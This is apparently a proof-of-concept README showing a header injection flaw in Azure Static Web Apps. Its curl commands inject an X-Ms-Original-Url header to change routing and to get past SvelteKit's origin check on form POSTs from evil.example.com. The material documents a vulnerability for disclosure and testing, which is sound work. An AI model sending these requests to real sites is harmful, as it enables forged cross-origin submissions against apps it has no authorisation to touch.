SWA x-ms-original-url Header Injection Demo

Test Endpoints

  • /debug — Shows what URL the backend sees (origin, pathname, search)
  • /form-action — Form with POST action (has SvelteKit origin check)

Repro Steps (run from terminal)

1. Confirm client header reaches backend

curl -s \
  -H "X-Ms-Original-Url: NOT_A_URL" \
  "https://<your-app>.azurestaticapps.net/debug"

Expected if vulnerable: 500 error (invalid URL passed to new Request())

2. Routing control via fragment terminator

curl -s \
  -H "X-Ms-Original-Url: https://x/debug#" \
  "https://<your-app>.azurestaticapps.net/does-not-exist"

Expected if vulnerable: returns the /debug response even though the real path is /does-not-exist

3. Origin bypass on form POST

# Control — should get 403:
curl -s -w "\n%{http_code}\n" -X POST \
  -H "Origin: https://evil.example.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test" \
  "https://<your-app>.azurestaticapps.net/form-action?/submit"

# Exploit — should get 200 if vulnerable:
curl -s -w "\n%{http_code}\n" -X POST \
  -H "Origin: https://evil.example.com" \
  -H "X-Ms-Original-Url: https://evil.example.com/form-action?/submit#" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test" \
  "https://<your-app>.azurestaticapps.net/form-action?/submit"
